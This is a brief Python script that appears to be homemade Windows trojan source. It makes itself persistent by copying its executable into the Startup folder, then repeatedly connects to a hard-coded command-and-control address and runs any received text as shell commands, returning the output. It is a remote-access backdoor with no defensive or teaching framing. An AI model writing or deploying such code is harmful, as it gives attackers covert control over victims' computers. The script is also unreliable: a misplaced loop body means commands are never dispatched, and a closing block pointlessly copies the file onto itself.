import socket
import subprocess
import threading
import time 
import os 
import shutil

CCIP = "192.168.0.113"
CCPORT = 443

def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py",".exe")
    #print(exe_file)
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programas\\Startup\"".format(exe_file))

def conn(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)

def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as error:
        print(error)

def cli(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
        if data == "/:kill":
            return
        else:
            threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
        client.close()

if __name__ == "__main__":
    autorun()
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            cli(client)
        else:
            time.sleep(3) 

arquivo = 'trojan.py'
num_copias = 10
for i in range(num_copias):
    novo_arquivo = 'trojan.py'
    f'trojan.py'
    shutil.copy('trojan.py', novo_arquivo)
